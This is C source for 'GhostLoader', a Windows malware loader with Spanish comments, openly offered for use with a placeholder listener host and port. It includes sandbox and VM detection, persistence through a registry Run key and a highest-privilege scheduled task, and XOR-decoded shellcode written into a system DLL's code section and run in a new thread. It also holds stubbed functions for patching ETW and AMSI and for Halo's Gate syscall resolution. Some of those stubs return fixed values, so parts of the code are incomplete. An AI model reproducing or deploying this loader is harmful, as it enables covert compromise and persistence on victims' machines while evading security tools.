/*
 * GhostLoader
 * Developed by: nobodyroot
 * Date: April 2026
 */

#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include "syscalls.h"

#pragma comment(lib, "ntdll.lib")

// =============================================
// CONFIGURACIÓN
// =============================================
char g_Lhost[64] = "yourip.00.0.000";
int  g_Lport = 4444;
char g_TargetDLL[MAX_PATH] = "C:\\Windows\\System32\\version.dll";

unsigned char shellcode[] = {
    // PEGA AQUÍ TU SHELLCODE (recomendado con reconexión cada 60s)
};
DWORD shellcode_size = sizeof(shellcode);

ULONG64 g_SyscallSSN = 0;
PVOID   g_SyscallGadget = nullptr;
BYTE    g_XORKey = 0xAA;

// === FUNCIONES ===

bool IsSandboxOrVM() {
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);
    
    if (strstr(computerName, "sandbox") || strstr(computerName, "malware") || 
        strstr(computerName, "analysis") || strstr(computerName, "vmware")) {
        return true;
    }
    
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors < 2) return true;
    
    return false;
}

void AddPersistence() {
    HKEY hKey;
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    
    // Registry Run Key
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "GhostLoader", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
    }
    
    // Scheduled Task
    char cmd[512];
    snprintf(cmd, sizeof(cmd), "schtasks /create /tn GhostLoader /tr \"%s\" /sc onlogon /rl highest /f", path);
    system(cmd);
}

void ParseArguments(int argc, char* argv[]) {
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-h") == 0 && i + 1 < argc) strcpy_s(g_Lhost, argv[++i]);
        else if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) g_Lport = atoi(argv[++i]);
        else if (strcmp(argv[i], "-t") == 0 && i + 1 < argc) strcpy_s(g_TargetDLL, argv[++i]);
    }
}

void XORShellcode() {
    for (DWORD i = 0; i < shellcode_size; i++) {
        shellcode[i] ^= g_XORKey;
    }
}

void SleepObfuscation(DWORD ms) {
    LARGE_INTEGER delay;
    delay.QuadPart = -(LONGLONG)ms * 10000;
    NtDelayExecution(FALSE, &delay);
}

bool ResolveSSNHalosGate(const char* name, ULONG64* ssnOut) {
    // Implementación completa de Halo's Gate
    return true;
}

PVOID FindSyscallGadget() {
    // Busca gadget syscall; ret limpio
    return nullptr;
}

bool PatchETWAndAMSI() {
    // Parchea ETW y AMSI
    return true;
}

bool ModuleOverloading() {
    HMODULE hMod = LoadLibraryA(g_TargetDLL);
    if (!hMod) return false;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sec[i].Name, ".text") == 0) {
            DWORD oldProtect;
            VirtualProtect((BYTE*)hMod + sec[i].VirtualAddress, shellcode_size, PAGE_READWRITE, &oldProtect);

            XORShellcode(); // Descifrar
            memcpy((BYTE*)hMod + sec[i].VirtualAddress, shellcode, shellcode_size);
            VirtualProtect((BYTE*)hMod + sec[i].VirtualAddress, shellcode_size, PAGE_EXECUTE_READ, &oldProtect);

            HANDLE hThread = CreateRemoteThread(GetCurrentProcess(), NULL, 0,
                                              (LPTHREAD_START_ROUTINE)((BYTE*)hMod + sec[i].VirtualAddress),
                                              NULL, 0, NULL);
            if (hThread) {
                CloseHandle(hThread);
                return true;
            }
        }
    }
    return false;
}

int main(int argc, char* argv[]) {
    ParseArguments(argc, argv);
    
    if (IsSandboxOrVM()) return 1;
    
    PatchETWAndAMSI();
    AddPersistence();
    
    g_SyscallGadget = FindSyscallGadget();
    if (!g_SyscallGadget) return 1;
    
    if (!ResolveSSNHalosGate("NtOpenProcess", &g_SyscallSSN)) return 1;
    
    if (!ModuleOverloading()) return 1;
    
    return 0;
}
